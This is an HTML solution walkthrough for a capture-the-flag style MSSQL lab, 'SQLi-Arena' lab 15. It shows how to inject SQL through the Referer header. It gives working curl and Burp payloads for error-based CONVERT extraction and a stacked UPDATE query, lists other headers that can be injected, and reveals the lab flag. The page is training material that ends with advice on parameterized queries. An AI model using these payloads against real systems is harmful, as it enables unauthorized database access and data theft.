<h4>Step 1: Observe the Attack Surface</h4>
<p>Click "Log a Visit" and observe the INSERT query. The <code>Referer</code> header is directly concatenated into SQL.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Visit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -H "Referer: http://google.com" \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab15" -d "visit=1"<br><br>
        <span class="prompt">SQL: </span>INSERT INTO page_visits (url, referer, visitor_ip) VALUES ('/SQLi-Arena/public/mssql/lab15&amp;mode=black&amp;visit=1', 'http://google.com', '127.0.0.1')<br>
        <span class="prompt">Result: </span><strong>Visit logged successfully.</strong> (entry appears in table)
    </div>
</div>

<h4>Step 2: Confirm Injection via Referer</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -H "Referer: '" \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab15" -d "visit=1"<br><br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: Incorrect syntax near '127.0'.</strong><br>
        <span class="prompt">// The quote breaks the SQL, confirming header injection!</span>
    </div>
</div>

<h4>Step 3: Error-Based Extraction via Referer</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CONVERT Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s \<br>
        &nbsp;&nbsp;-H "Referer: ' + CONVERT(VARCHAR, CONVERT(INT, (SELECT TOP 1 flag FROM flags))) + '" \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab15" -d "visit=1"<br><br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_r3f3r3r_h34d3r_1nj}' to data type int.</strong>
    </div>
</div>

<h4>Step 4: Stacked Query. Copy Flag to Visit Log</h4>
<p>Close the INSERT VALUES properly, then UPDATE an existing visit with the flag:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Stacked UPDATE</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s \<br>
        &nbsp;&nbsp;-H "Referer: x', '127.0.0.1'); UPDATE page_visits SET referer=(SELECT TOP 1 flag FROM flags) WHERE id=20; -- -" \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab15" -d "visit=1"<br><br>
        <span class="prompt">Result: </span><strong>Visit logged successfully.</strong><br>
        <span class="prompt">// Visit #20 now shows flag in the Referer column (visible in top 10):</span><br>
        <span class="prompt">Table row: </span>20 | /SQLi-Arena/?... | <strong>FLAG{ms_r3f3r3r_h34d3r_1nj}</strong> | 127.0.0.1
    </div>
</div>

<h4>Step 5: Using Burp Suite</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Burp Suite Intercept</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">GET </span>/mssql/lab15&amp;mode=black&amp;visit=1 HTTP/1.1<br>
        <span class="prompt">Host: </span>target<br>
        <span class="prompt">Referer: </span>' + CONVERT(VARCHAR, CONVERT(INT, (SELECT TOP 1 flag FROM flags))) + '<br>
        <span class="prompt">Connection: </span>close
    </div>
</div>

<h4>Step 6: Other Injectable Headers</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Common Header Targets</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Referer:        </span>often logged for analytics (this lab)<br>
        <span class="prompt">User-Agent:     </span>browser identification, frequently logged<br>
        <span class="prompt">X-Forwarded-For:</span>IP logging behind proxies/CDNs<br>
        <span class="prompt">Cookie:         </span>session data inserted into queries<br>
        <span class="prompt">Accept-Language:</span>stored for localization
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_r3f3r3r_h34d3r_1nj}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> HTTP headers are <strong>user-controlled input</strong> and
    must be treated with the same suspicion as URL parameters or form data. The Referer,
    User-Agent, X-Forwarded-For, and other headers can all be freely modified by attackers.
    Never concatenate HTTP header values into SQL queries. Use parameterized queries for
    all database interactions, regardless of the input source.
</div>
